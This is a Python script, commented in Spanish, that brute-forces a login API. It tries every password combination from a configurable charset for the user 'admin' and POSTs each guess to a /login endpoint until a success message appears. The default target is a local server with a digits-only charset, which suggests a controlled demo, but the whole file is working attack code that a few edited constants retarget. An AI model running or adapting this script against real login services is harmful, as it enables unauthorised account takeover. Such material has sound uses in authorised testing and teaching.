import requests
import time
import itertools
import sys

# Configuración
BASE_URL = "http://127.0.0.1:8000"  # URL de tu API
TARGET_USER = "admin"            # Usuario objetivo
CHARSET = "0123456789"       # Pequeño para pruebas rápidas (cambia a "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" para completo, ¡pero demora!)
SUCCESS_MESSAGE = "Aleluya"         # Texto de éxito en tu API
MAX_LENGTH = 4                      # Máx si pruebas secuencial

def estimate_remaining(attempts_per_sec, remaining_combos):
    """Estima tiempo restante en segundos"""
    if attempts_per_sec > 0:
        return remaining_combos / attempts_per_sec
    return float('inf')

print("=== ATAQUE DE FUERZA BRUTA CLÁSICA (VERSIÓN CONTROLADA) ===")
print(f"Objetivo: Usuario '{TARGET_USER}'")
print(f"Charset: {CHARSET} (tamaño: {len(CHARSET)})")
print(f"Espacio total estimado (hasta {MAX_LENGTH} chars): ~{sum(len(CHARSET)**i for i in range(1, MAX_LENGTH+1)):,} combinaciones")
print(f"API: {BASE_URL}/login")
print("----------------------------------------")

# Input interactivo para longitud
print("\nOpciones de longitud:")
print("1. Secuencial: Prueba de 1 a MAX_LENGTH dígitos (automático, descubre la longitud)")
print("2. Específica: Ingresa la longitud conocida (ej: 4 para probar solo 4 dígitos)")
choice = input("Elige (1 o 2): ").strip()

if choice == "2":
    try:
        specific_length = int(input("Ingresa la longitud (1-10): "))
        lengths = [specific_length]
        print(f"Probando solo longitud {specific_length} ({len(CHARSET)**specific_length:,} combinaciones)")
    except ValueError:
        print("Entrada inválida. Usando secuencial.")
        lengths = range(1, MAX_LENGTH + 1)
else:
    lengths = range(1, MAX_LENGTH + 1)
    print(f"Probando longitudes secuenciales: 1 a {MAX_LENGTH}")

start_time = time.time()
attempts = 0
found = False
total_start = start_time  # Para tiempo global

for length in lengths:
    if found:
        break
    
    print(f"\n--- Probando longitud {length} ({len(CHARSET)**length:,} combinaciones posibles) ---")
    length_start = time.time()
    length_attempts = 0
    
    # Generar todas las combinaciones de esta longitud
    for combo in itertools.product(CHARSET, repeat=length):
        password = ''.join(combo)
        attempts += 1
        length_attempts += 1
        
        # Enviar POST
        payload = {"username": TARGET_USER, "password": password}
        try:
            response = requests.post(f"{BASE_URL}/login", json=payload, timeout=5)
            response_text = response.json().get("message", "")
        except requests.RequestException as e:
            print(f"Error en solicitud: {e}")
            continue
        
        # Verificar éxito
        if SUCCESS_MESSAGE in response_text:
            end_time = time.time()
            total_time = end_time - total_start
            print(f"\n[+] ¡ÉXITO! Contraseña encontrada: '{password}' (longitud {length})")
            print(f"[+] Intentos totales: {attempts}")
            print(f"[+] Tiempo total: {total_time:.2f} segundos")
            print(f"[+] Tasa promedio: {attempts / total_time:.2f} intentos/segundo")
            found = True
            break
        else:
            # Progreso cada 500 intentos (ajusta para más/less verbose)
            if length_attempts % 500 == 0:
                elapsed_length = time.time() - length_start
                attempts_per_sec = length_attempts / elapsed_length if elapsed_length > 0 else 0
                remaining = len(CHARSET)**length - length_attempts
                est_remaining = estimate_remaining(attempts_per_sec, remaining)
                est_time_str = f"{est_remaining/60:.1f} min" if est_remaining < 3600 else f"{est_remaining/3600:.1f} horas"
                print(f"[-] Progreso longitud {length}: {length_attempts:,}/{len(CHARSET)**length:,} intentos "
                      f"(tasa: {attempts_per_sec:.1f}/s, estimado restante: {est_time_str})")
        
        # Pausa para no sobrecargar (ajusta o comenta)
        time.sleep(0.05)
    
    if not found:
        length_time = time.time() - length_start
        print(f"[!] Longitud {length} agotada sin éxito ({length_attempts} intentos, {length_time:.2f}s)")

# Resultado final
if not found:
    total_time = time.time() - total_start
    print(f"\n[!] Ataque finalizado sin éxito (agotó {attempts} combinaciones).")
    print(f"[!] Intentos totales: {attempts}")
    print(f"[!] Tiempo total: {total_time:.2f} segundos")
    print(f"[!] Tasa: {attempts / total_time:.2f} intentos/segundo")

print("=== FIN DEL ATAQUE ===")
